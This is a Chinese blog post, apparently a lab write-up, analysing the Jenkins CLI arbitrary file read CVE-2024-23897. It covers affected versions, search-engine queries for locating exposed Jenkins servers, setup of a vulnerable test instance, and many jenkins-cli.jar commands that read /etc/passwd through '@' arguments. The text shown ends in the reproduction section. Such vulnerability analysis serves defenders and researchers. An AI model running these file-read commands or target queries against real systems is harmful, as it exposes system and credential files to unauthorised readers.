<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />


    <meta name="description" content="浅谈CVE-2024-23897-Jenkins CLI任意文件读取      Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，提供了数百个插件来支持构建，部署和自动化任何项目。截至 2023 年，其市场份额约占 44%，可见 Jenkins 的受欢迎程度，这也意味着 Jenkins 中的安全漏洞可能会产生重大影响。关于Jenkins cli的漏洞也">
<meta property="og:type" content="article">
<meta property="og:title" content="浅谈CVE-2024-23897-Jenkins CLI任意文件读取">
<meta property="og:url" content="https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/index.html">
<meta property="og:site_name" content="Bealee&#39;s Blog">
<meta property="og:description" content="浅谈CVE-2024-23897-Jenkins CLI任意文件读取      Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，提供了数百个插件来支持构建，部署和自动化任何项目。截至 2023 年，其市场份额约占 44%，可见 Jenkins 的受欢迎程度，这也意味着 Jenkins 中的安全漏洞可能会产生重大影响。关于Jenkins cli的漏洞也">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://www.jenkins.io/images/logos/jenkins/Jenkins-stop-the-war.svg">
<meta property="og:image" content="https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/image-20240201180032393.png">
<meta property="og:image" content="https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/image-20240201182550200.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240201164749669.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240201164156338.png">
<meta property="og:image" content="https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/image-20240201165249943.png">
<meta property="og:image" content="https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/image-20240201174026495.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240201184805453.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240326172421384.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240329105445054.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240329105539742.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240329114529941.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240329114638405.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240329115857540.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240326184436528.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240329122431736.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240329122617776.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240330045636284.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240126181651217.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240127170004652.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240127170806937.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240330041754003.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240326145617117.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240326150201154.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240327021444616.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240330024025133.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240330043547620.png">
<meta property="og:image" content="https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/image-20240330025822587.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240330031638065.png">
<meta property="og:image" content="https://bealee008.github.io/image-20240327014407390.png">
<meta property="article:published_time" content="2024-03-30T16:21:02.154Z">
<meta property="article:modified_time" content="2024-03-30T16:17:37.976Z">
<meta property="article:author" content="Bealee">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.jenkins.io/images/logos/jenkins/Jenkins-stop-the-war.svg">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>浅谈CVE-2024-23897-Jenkins CLI任意文件读取</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="Bealee&#39;s Blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.2"></head>






<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/happy/">Happy</a></li><!--
     --><!--
       --><li><a href="/tag/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/kpi/">Kpi</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/08/18/Hackerone%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A-XSS%20ATO/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&text=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&title=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&is_video=false&description=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=浅谈CVE-2024-23897-Jenkins CLI任意文件读取&body=Check out this article: https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&title=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&title=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&title=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&title=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&name=浅谈CVE-2024-23897-Jenkins CLI任意文件读取&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&t=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%85%E8%B0%88CVE-2024-23897-Jenkins-CLI%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.</span> <span class="toc-text">浅谈CVE-2024-23897-Jenkins CLI任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞描述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.1.1.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%AF%B4%E6%98%8E"><span class="toc-number">1.1.2.</span> <span class="toc-text">利用说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%99%90%E5%88%B6"><span class="toc-number">1.1.3.</span> <span class="toc-text">利用限制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7%E6%B5%8B%E7%BB%98"><span class="toc-number">1.2.</span> <span class="toc-text">资产测绘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jenkins%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">Jenkins测试环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.3.1.</span> <span class="toc-text">Windows系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.3.2.</span> <span class="toc-text">Linux系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.3.</span> <span class="toc-text">Docker环境搭建</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">1.5.</span> <span class="toc-text">漏洞原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95"><span class="toc-number">1.5.1.</span> <span class="toc-text">漏洞调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E8%A1%A5%E4%B8%81"><span class="toc-number">1.5.2.</span> <span class="toc-text">官方补丁</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B-amp-%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.</span> <span class="toc-text">漏洞批量检测&amp;利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E8%AF%86%E5%88%AB%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.1.</span> <span class="toc-text">版本识别原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B"><span class="toc-number">1.6.2.</span> <span class="toc-text">批量版本检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.6.3.</span> <span class="toc-text">漏洞检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E5%9C%BA%E6%99%AF%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.4.</span> <span class="toc-text">实战场景利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF1-%E8%A7%A3%E9%94%81Jenkins"><span class="toc-number">1.6.4.0.1.</span> <span class="toc-text">场景1  解锁Jenkins</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF2-Jenkins%E7%99%BB%E5%BD%95"><span class="toc-number">1.6.4.0.2.</span> <span class="toc-text">场景2  Jenkins登录</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.7.</span> <span class="toc-text">修复建议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%B8%A1%E6%96%B9%E6%A1%88"><span class="toc-number">1.7.1.</span> <span class="toc-text">过渡方案</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.9.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        浅谈CVE-2024-23897-Jenkins CLI任意文件读取
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Bealee</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-03-30T16:21:02.154Z" itemprop="datePublished">2024-03-31</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="浅谈CVE-2024-23897-Jenkins-CLI任意文件读取"><a href="#浅谈CVE-2024-23897-Jenkins-CLI任意文件读取" class="headerlink" title="浅谈CVE-2024-23897-Jenkins CLI任意文件读取"></a>浅谈CVE-2024-23897-Jenkins CLI任意文件读取</h1><p align="center">
  <img src="https://www.jenkins.io/images/logos/jenkins/Jenkins-stop-the-war.svg" alt="Jenkins" style="zoom: 20%;" />
</p>

<p>Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，提供了数百个插件来支持构建，部署和自动化任何项目。截至 2023 年，其市场份额约占 44%，可见 Jenkins 的受欢迎程度，这也意味着 Jenkins 中的安全漏洞可能会产生重大影响。关于Jenkins cli的漏洞也披露过很多，许多漏洞值得分析学习。</p>
<table>
<thead>
<tr>
<th>CVE编号</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>CVE-2017-1000353</td>
<td>Jenkins-cli 远程代码执行</td>
</tr>
<tr>
<td>CVE-2018-1999003</td>
<td>Jenkins-cli  未经授权访问漏洞</td>
</tr>
<tr>
<td>CVE-2019-1003005</td>
<td>Jenkins-cli  信息泄露</td>
</tr>
<tr>
<td>CVE-2019-1003029</td>
<td>Jenkins-cli  路径穿越</td>
</tr>
<tr>
<td>CVE-2019-1003030</td>
<td>Jenkins-cli 命令注入</td>
</tr>
<tr>
<td>CVE-2019-10212</td>
<td>Jenkins-cli  CSRF</td>
</tr>
<tr>
<td>CVE-2019-17638</td>
<td>Jenkins-cli  命令执行</td>
</tr>
<tr>
<td>CVE-2020-2102</td>
<td>Jenkins-cli  身份验证绕过</td>
</tr>
<tr>
<td>CVE-2020-2103</td>
<td>Jenkins-cli  远程代码执行</td>
</tr>
<tr>
<td>CVE-2020-2111</td>
<td>Jenkins-cli  信息泄露</td>
</tr>
<tr>
<td>CVE-2020-2221</td>
<td>Jenkins-cli  授权绕过</td>
</tr>
<tr>
<td>CVE-2024-23897</td>
<td>Jenkins-cli 接口任意文件读取</td>
</tr>
<tr>
<td>CVE-2024-23898</td>
<td>Jenkins-cli 跨站WebSocket劫持</td>
</tr>
</tbody></table>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Jenkins 内置了命令行界面(CLI)来从脚本或 Shell 环境访问。CLI 使用 args4j 库解析参数时，存在一个特性可以用文件内容替换参数中以<code>@</code>开头后跟路径的内容。这个特性在 Jenkins 2.441 及之前的版本中默认打开,且不会将其关闭，这允许攻击者读取 Jenkins 控制器文件系统中的任意文件。</p>
<blockquote>
<p>漏洞编号: CVE-2024-23897<br>危害定级: 高危<br>漏洞标签: 文件读取<br>披露日期: 2024-01-24</p>
</blockquote>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>漏洞版本：<br>Jenkins &lt;&#x3D;2.441<br>Jenkins &lt;&#x3D;LST2.426.2</p>
<p>安全版本：<br>Jenkins &gt;2.441<br>Jenkins &gt;LST2.426.2</p>
<h3 id="利用说明"><a href="#利用说明" class="headerlink" title="利用说明"></a>利用说明</h3><p>Jenkins 有一个内置的命令行界面 CLI，可以从脚本或 shell 环境访问 Jenkins。处理 CLI 命令时， Jenkins 使用<code>args4j</code>库解析 Jenkins 控制器上的命令参数和选项。此命令解析器具有一个功能，可以将<code>@</code>参数中后跟文件路径的字符替换为文件内容 ( <code>expandAtFiles</code>)。此功能默认启用，Jenkins 2.441 及更早版本、LTS 2.426.2 及更早版本不会禁用它，这允许攻击者使用 Jenkins 控制器进程的默认字符编码读取 Jenkins 控制器文件系统上的任意文件。</p>
<p>args4j 库：<a target="_blank" rel="noopener" href="https://github.com/kohsuke/args4j">https://github.com/kohsuke/args4j</a><br>Jenkins  CLI：<a target="_blank" rel="noopener" href="https://www.jenkins.io/doc/book/managing/cli/">https://www.jenkins.io/doc/book/managing/cli/</a><br>Jenkins  CLI通过自身搭建的jenkins拼接<code>/jnlpJars/jenkins-cli.jar</code>即可本地下载<br><img src="image-20240201180032393.png" alt="image-20240201180032393" style="zoom:50%;float:left" /></p>
<h3 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h3><ul>
<li><strong>是否具有Overall&#x2F;Read（匿名用户可读）权限</strong>，具有Overall&#x2F;Read权限的攻击者可以读取整个文件，没有Overall&#x2F;Read权限的攻击者可以通过特殊命令读取文件1~3行的内容，可以读取的行数取决于可用的CLI命令。</li>
<li><strong>服务端字符集是否兼容读取二进制文件</strong></li>
</ul>
<h2 id="资产测绘"><a href="#资产测绘" class="headerlink" title="资产测绘"></a>资产测绘</h2><p>Hunter&#x3D;&#x3D;&gt; app.name&#x3D;”Jenkins”<br>FOFA&#x3D;&#x3D;&gt; app&#x3D;”Jenkins”<br>Shodan&#x3D;&#x3D;&gt; product: “Jenkins” </p>
<h2 id="Jenkins测试环境搭建"><a href="#Jenkins测试环境搭建" class="headerlink" title="Jenkins测试环境搭建"></a>Jenkins测试环境搭建</h2><h3 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h3><p>Windows下载jenkins.msi程序，需下载安装存在漏洞的版本，需指定版本的java环境。</p>
<blockquote>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/jenkinsci/jenkins/releases">https://github.com/jenkinsci/jenkins/releases</a></p>
<p>Windows安装教程：<a target="_blank" rel="noopener" href="https://www.jenkins.io/doc/book/installing/windows/">https://www.jenkins.io/doc/book/installing/windows/</a></p>
</blockquote>
<h3 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h3><p>需下载安装存在漏洞的版本，需指定版本的java环境。</p>
<blockquote>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/jenkinsci/jenkins/releases">https://github.com/jenkinsci/jenkins/releases</a></p>
</blockquote>
<p>选择jenkins.war文件，直接通过这条命令运行：java -jar jenkins.war<br>开启5005端口远程调试运行：java -Xdebug  -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;0.0.0.0:5005” -jar jenkins.war</p>
<h3 id="Docker环境搭建"><a href="#Docker环境搭建" class="headerlink" title="Docker环境搭建"></a>Docker环境搭建</h3><blockquote>
<p>指定jenkins2.441版本<br>docker pull jenkins&#x2F;jenkins:2.441</p>
<p>开启5005端口远程调试运行<br>docker run -e “JAVA_OPTS&#x3D;-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;0.0.0.0:5005” -d –name jenkins -p 8081:8080 -p 5005:5005  jenkins&#x2F;jenkins:2.441</p>
</blockquote>
<p>遇到安装、部署、如何使用Jenkins的问题参考这篇教程：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/676837714">https://zhuanlan.zhihu.com/p/676837714</a></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
<p>Version：Jenkins 2.441</p>
</blockquote>
<p>Jenkins管理面板默认关闭匿名用户可读权限</p>
<img src="image-20240201182550200.png" alt="image-20240201182550200" style="zoom:50%;float:left" />

<p>文件读取有两种情况：</p>
<ul>
<li><p>当Jenkins开启了“匿名用户可读”功能，大部分命令都可以被调用，可以读取文件全部内容</p>
<p>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> help @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8082/">http://127.0.0.1:8082</a> who-am-i  @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> keep-build @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> restart @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> shutdown @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> safe-shutdown @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> disable-jobenable-job @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8082/">http://127.0.0.1:8082</a> -auth admin:Admin@123 -http who-am-i @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8082/">http://127.0.0.1:8082</a> -auth admin:Admin@123 -webSocket who-am-i @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8082/">http://127.0.0.1:8082</a> -webSocket who-am-i @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> add-job-to-view @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> build @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> cancel-quiet-down @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> clear-queue @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> connect-node @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> console @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> copy-job @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> create-credentials-by-xml @&#x2F;etc&#x2F;passwd</p>
</li>
<li><p>当Jenkins关闭了“匿名用户可读”功能，有如下命令可以被调用，可以读取0~3行文件内容</p>
<p>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> help @&#x2F;etc&#x2F;passwd	（读取文件前2行）<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8082/">http://127.0.0.1:8082</a> who-am-i  @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> keep-build @&#x2F;etc&#x2F;passwd	（读取文件第3行）<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> restart @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> shutdown @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> safe-shutdown @&#x2F;etc&#x2F;passwd<br>​	java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> disable-jobenable-job @&#x2F;etc&#x2F;passwd</p>
</li>
</ul>
<p>当在没有开启匿名可读权限时是不允许读取文件，如使用connect-node命令读取文件时，会报如下图的错误，也就是说在没有开启匿名可读权限时是不允许读取文件的<br>java -jar .\jenkins-cli.jar -s “<a target="_blank" rel="noopener" href="http://ip:8082/">http://ip:8082</a>“ connect-node “@&#x2F;etc&#x2F;passwd”<br><img src="/image-20240201164749669.png"></p>
<p>当开启匿名用户可读权限时，大部分命令都可以读取整个文件的内容<br>java -jar .\jenkins-cli.jar -s “<a target="_blank" rel="noopener" href="http://ip:8082/">http://ip:8082</a>“ connect-node “@&#x2F;etc&#x2F;passwd”<br><img src="/image-20240201164156338.png" alt="image-20240201164156338"></p>
<p>当不具有匿名用户可读权限的时候，只有命令读取文件的0~3行内容，如使用help命令读取文件时，在没有开启读写权限时能读取到文件内容前2行，原理是利用报错增加返回数据内容<br>java -jar .\jenkins-cli.jar -s “<a target="_blank" rel="noopener" href="http://127.0.0.1:8082/">http://127.0.0.1:8082</a>“ help “@&#x2F;etc&#x2F;passwd”<br><img src="image-20240201165249943.png" alt="image-20240201165249943" style=""/></p>
